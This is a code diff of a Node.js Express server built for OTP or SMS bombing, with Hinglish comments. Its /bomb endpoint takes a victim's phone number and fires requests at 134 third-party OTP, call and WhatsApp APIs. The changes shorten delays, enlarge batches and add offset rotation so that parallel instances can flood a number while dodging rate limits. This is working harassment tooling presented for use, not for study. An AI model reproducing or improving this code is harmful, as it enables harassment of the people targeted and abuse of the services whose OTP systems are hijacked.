@@ -1,6 +1,7 @@
 // ============================================================
-// api_server.js - OTP Bombing API Server (SIRF WORKING APIs)
-// 134 Verified Working APIs Only | Rejected/RL/Failed REMOVED
+// api_server.js - OTP Bombing API Server (FAST + OFFSET ROTATION)
+// 134 Working APIs | Offset-based rotation
+// Har server alag APIs call karega same time pe
 // ============================================================
 
 const express = require('express');
@@ -12,10 +13,14 @@ app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 
-// 🔥 CONFIGURATION
+// 🔥 FAST CONFIGURATION
 const MAX_DURATION_MIN = 10;
-const BATCH_DELAY_MS = 100;
-const API_DELAY_MS = 50;
+const BATCH_DELAY_MS = 20;        // 100 → 20
+const BATCH_SIZE = 20;            // 5 → 20
+const API_TIMEOUT_MS = 2500;      // 5000 → 2500
+
+// ⚡ Config
+const APIS_PER_CALL = 10;         // Har call me kitni APIs (134/13 ≈ 10)
 
 // ============================================================
 // ===== SIRF 134 WORKING APIs (2xx Success Verified) =====
@@ -1225,7 +1230,7 @@ async function makeApiCall(api, phone, retryCount = 0) {
         }
 
         const method = api.method.toLowerCase();
-        const config = { method, url, headers, timeout: 5000, validateStatus: () => true };
+        const config = { method, url, headers, timeout: API_TIMEOUT_MS, validateStatus: () => true };
 
         if (method === 'post' || method === 'put') {
             if (isRaw || typeof data === 'string') {
@@ -1275,30 +1280,42 @@ async function makeApiCall(api, phone, retryCount = 0) {
 }
 
 // ============================================================
-// ===== BOMBING LOGIC =====
+// ===== ROTATION HELPER =====
 // ============================================================
 
-async function runBombing(phone, effectiveDuration) {
+function rotateAPIs(apis, offset) {
+    const safeOffset = ((offset % apis.length) + apis.length) % apis.length;
+    return [
+        ...apis.slice(safeOffset),
+        ...apis.slice(0, safeOffset)
+    ];
+}
+
+// ============================================================
+// ===== BOMBING LOGIC (⚡ FAST + OFFSET ROTATION) =====
+// ============================================================
+
+async function runBombing(phone, effectiveDuration, apisToUse) {
     const startTime = Date.now();
     let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
     let rateLimited = 0, rejected = 0, failed = 0;
 
-    let maxRequests = 100;
-    if (effectiveDuration <= 1) maxRequests = 200;
-    else if (effectiveDuration <= 5) maxRequests = 150;
-    else if (effectiveDuration <= 10) maxRequests = 100;
-    else maxRequests = 80;
+    // ⚡ maxRequests = apisToUse.length × 3-5
+    let maxRequests = apisToUse.length * 3;
+    if (effectiveDuration <= 1) maxRequests = apisToUse.length * 5;
+    else if (effectiveDuration <= 5) maxRequests = apisToUse.length * 4;
+    else if (effectiveDuration <= 10) maxRequests = apisToUse.length * 3;
 
-    const shuffled = [...APIS];
+    // Shuffle apisToUse
+    const shuffled = [...apisToUse];
     for (let i = shuffled.length - 1; i > 0; i--) {
         const j = Math.floor(Math.random() * (i + 1));
         [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
     }
 
-    console.log(`📋 Total Working APIs: ${shuffled.length}`);
+    console.log(`📋 APIs in pool: ${shuffled.length} | maxRequests: ${maxRequests}`);
 
     let sent = 0;
-    const BATCH_SIZE = 5;
 
     for (let i = 0; i < shuffled.length && sent < maxRequests; i += BATCH_SIZE) {
         const batch = shuffled.slice(i, Math.min(i + BATCH_SIZE, shuffled.length));
@@ -1342,7 +1359,7 @@ app.get('/', (req, res) => {
         status: 'ok',
         instance: process.env.INSTANCE_NAME || 'api',
         total_apis: APIS.length,
-        note: 'SIRF WORKING APIs (134 Verified 2xx Success)',
+        note: '134 Working APIs + OFFSET ROTATION',
         max_duration_min: MAX_DURATION_MIN,
         uptime: Math.round(process.uptime()) + 's'
     });
@@ -1421,19 +1438,26 @@ app.get('/reset-stats', (req, res) => {
 });
 
 app.post('/bomb', async (req, res) => {
-    const { phone, duration, instance } = req.body;
+    const { phone, duration, instance, offset = 0 } = req.body;   // ⚡ offset add
     if (!phone || phone.length !== 10) return res.status(400).json({ error: 'Invalid phone number.' });
 
     const requestedDuration = Number(duration) || 1;
     const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);
 
-    console.log(`\n📱 Bombing ${phone} | Requested: ${requestedDuration}min | Effective: ${effectiveDuration}min`);
+    // ⚡ Offset ke hisaab se APIs rotate karo
+    const rotatedAPIS = rotateAPIs(APIS, offset);
+    
+    // ⚡ Sirf 10 APIs use karo
+    const apisToUse = rotatedAPIS.slice(0, APIS_PER_CALL);
+
+    console.log(`\n📱 Bombing ${phone} | Offset: ${offset} | Using APIs from position ${offset % APIS.length}`);
 
     try {
-        const result = await runBombing(phone, effectiveDuration);
+        const result = await runBombing(phone, effectiveDuration, apisToUse);
         console.log(`✅ DONE | ${phone} | OK: ${result.success} | RL: ${result.rateLimited} | Rejected: ${result.rejected} | Failed: ${result.failed} | ${result.elapsed}s\n`);
         res.json({
             success: true, phone,
+            offset_used: offset,
             requested_duration: requestedDuration,
             effective_duration: effectiveDuration,
             instance: instance || 'default',
@@ -1445,7 +1469,8 @@ app.post('/bomb', async (req, res) => {
             rejected: result.rejected,
             failed: result.failed,
             elapsed: result.elapsed + 's',
-            total_apis: APIS.length
+            total_apis: APIS.length,
+            apis_used: apisToUse.length
         });
     } catch (error) {
         console.error('Bombing error:', error);
@@ -1456,7 +1481,7 @@ app.post('/bomb', async (req, res) => {
 app.get('/apis', (req, res) => {
     res.json({
         total: APIS.length,
-        note: 'SIRF WORKING APIs (134 Verified 2xx Success)',
+        note: '134 Working APIs + OFFSET ROTATION',
         api_names: APIS.map(a => a.name)
     });
 });
@@ -1466,15 +1491,8 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('═══════════════════════════════════════════');
     console.log(`🚀 API Server on port ${PORT}`);
     console.log(`📊 Total WORKING APIs: ${APIS.length}`);
+    console.log(`⚡ APIs per call: ${APIS_PER_CALL}`);
+    console.log(`🔄 Offset rotation: ACTIVE`);
     console.log(`⏱️ Max duration: ${MAX_DURATION_MIN} min`);
-    console.log('═══════════════════════════════════════════');
-    console.log('Endpoints:');
-    console.log('  GET  /              Status');
-    console.log('  GET  /health        Health');
-    console.log('  GET  /test?phone=X  Test all');
-    console.log('  GET  /stats         Stats');
-    console.log('  GET  /logs          Recent logs');
-    console.log('  GET  /apis          List');
-    console.log('  POST /bomb          Bombing');
     console.log('═══════════════════════════════════════════');
 });
